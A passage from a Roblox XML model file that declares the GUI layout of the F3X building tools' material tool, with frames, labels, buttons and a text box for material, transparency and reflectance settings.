											<UDim2 name="Position">
												<XS>0.800000012</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0.200000003</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="TextButton" referent="RBX9CBAE16323EB4AF1A4C13CEAF46A7423">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.5</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">4</token>
										<token name="FontSize">5</token>
										<bool name="Modal">false</bool>
										<string name="Name">CloseButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>45</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text">Close</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">14</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.850000024</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBX2F322FBF868949DDAB37225F5EA752AD">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4278190080</Color3>
											<float name="BackgroundTransparency">0.699999988</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Shadow</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>-2</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>2</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
							</Item>
						</Item>
						<Item class="Frame" referent="RBX54AADB16E6C34DA8BFC97BFFC59FA0AB">
							<Properties>
								<bool name="Active">true</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4288914085</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">0</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">true</bool>
								<string name="Name">BTMaterialToolGUI</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>172</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0</XS>
									<XO>200</XO>
									<YS>0</YS>
									<YO>145</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
							<Item class="Frame" referent="RBXE69AE88C16A44F2BBA273879F508A7EB">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Title</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>20</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBX16A51E153BAB43B2BF9FB48D2F681EE2">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4285215356</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ColorBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>5</XO>
											<YS>0</YS>
											<YO>-3</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-5</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBX1B54C1F7D54F4940AFD5F149DFA59491">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-10</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">MATERIAL TOOL</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBXCD25F71BD0144EAE8625A87E944F75AF">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">5</token>
										<string name="Name">F3XSignature</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-10</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">F3X</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">14</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.899999976</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">1</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
							<Item class="Frame" referent="RBX3402BD2F581244389FCE493C62F16CC8">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">MaterialOption</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>14</XO>
										<YS>0</YS>
										<YO>30</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>-14</XO>
										<YS>0</YS>
										<YO>25</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextLabel" referent="RBX616E2DE559944757849132649A12EC67">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>40</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">Material</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
							<Item class="Frame" referent="RBX30F07F97A12443569670B11AAB690513">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">TransparencyOption</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>65</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextLabel" referent="RBX00DD98DAB7934043A01CEB46272D6540">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>14</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>70</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">Transparency</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBX658D6738269B45D2BAF52056FF677F97">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">TransparencyInput</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>90</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>50</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextButton" referent="RBX3B76D915FC1148359050E193578C0B0D">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<bool name="AutoButtonColor">false</bool>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">0</token>
											<token name="FontSize">0</token>
											<bool name="Modal">false</bool>
											<string name="Name">TextButton</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<bool name="Selected">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<string name="Text"></string>
											<Color3 name="TextColor3">4279970357</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">8</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">2</int>
										</Properties>
									</Item>
									<Item class="ImageLabel" referent="RBXE82CB3DE54334A94A6FAA6DEA795968D">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
											<Color3 name="ImageColor3">4294967295</Color3>
											<Vector2 name="ImageRectOffset">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Vector2 name="ImageRectSize">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<float name="ImageTransparency">0</float>
											<string name="Name">Background</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<token name="ScaleType">0</token>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<Rect2D name="SliceCenter">
												<min>
													<X>0</X>
													<Y>0</Y>
												</min>
												<max>
													<X>0</X>
													<Y>0</Y>
												</max>
											</Rect2D>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBXDE426F0A082A48D4A1491581AC607DCC">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">0</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">SelectedIndicator</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>-2</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-4</XO>
												<YS>0</YS>
												<YO>2</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextBox" referent="RBXA1D0027ED50A4DF18D7DBDD184529A48">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClearTextOnFocus">true</bool>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<bool name="MultiLine">false</bool>
											<string name="Name">TextBox</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<bool name="ShowNativeInput">true</bool>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-10</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text"></string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
							</Item>
							<Item class="Frame" referent="RBXEE3498894CDC443CA9DADA01A32CE84A">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">ReflectanceOption</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>100</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextLabel" referent="RBX8EE5D047F3F3455BADA5F8A5B655F713">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>14</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>70</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">Reflectance</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBXCDA6274B5EED4F62A7C2D8D9D8BEE108">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ReflectanceInput</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>85</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>50</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextButton" referent="RBXAF97925506694682B40C86A6E7F7FD16">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<bool name="AutoButtonColor">false</bool>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">0</token>
											<token name="FontSize">0</token>
											<bool name="Modal">false</bool>
											<string name="Name">TextButton</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<bool name="Selected">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<string name="Text"></string>
											<Color3 name="TextColor3">4279970357</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">8</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">2</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBXD933A1367BB64AEAA152B237E07BD8AB">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
